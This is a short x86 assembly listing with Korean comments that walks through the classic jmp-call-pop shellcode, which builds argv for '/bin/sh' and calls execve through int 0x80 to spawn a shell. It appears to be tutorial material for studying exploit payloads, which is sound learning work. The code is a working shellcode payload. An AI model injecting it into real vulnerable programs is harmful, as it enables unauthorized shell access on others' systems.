BITS 32
 
jmp short last      ; shell함수를 호출하기 위해 "last:"로 이동합니다.
 
shell:
    ; int execve(const char *filename, char *const argv [], char *const envp[])
    pop ebx             ; EBX 레지스터에 문자열의 시작 주소를 저장합니다.
    xor eax, eax        ; EAX 레지스터의 값을 0으로 만듭니다.
    mov [ebx+7],al      ; 문자열 "/bin/sh"끝에 Null byte를 저장합니다.
    mov [ebx+8],ebx     ; [ebx+8] 영역에 EBX 레지스터에 저장된 주소 값을 저장합니다.
    mov [ebx+12],eax    ; [ebx+12] 영역에 EAX 레지스터에 저장된 32비트 Null byte를 저장합니다.
    lea ecx, [ebx+8]    ; argv 포인터의 값으로 [ebx+8]의 주소를 ECX 레지스터에 저장 합니다.
    lea edx, [ebx+12]   ; envp 포인터의 값으로 [ebx+12]의 주소를 EDX 레지스터에 저장 합니다.
    mov al, 11          ; AL 레지스터에 execve() 시스템 함수의 콜 번호를 저장합니다.
    int 0x80            ; 함수 실행
 
last:
    call shell          ; 문자열 "/bin/sh" 주소를 Stack에 저장하기 위해 해당 형태를 사용합니다.
    db '/bin/sh'        ; call 명령어은 해당 주소를 shell 함수 종료 후 돌아갈 주소로 Stack에 저장합니다.
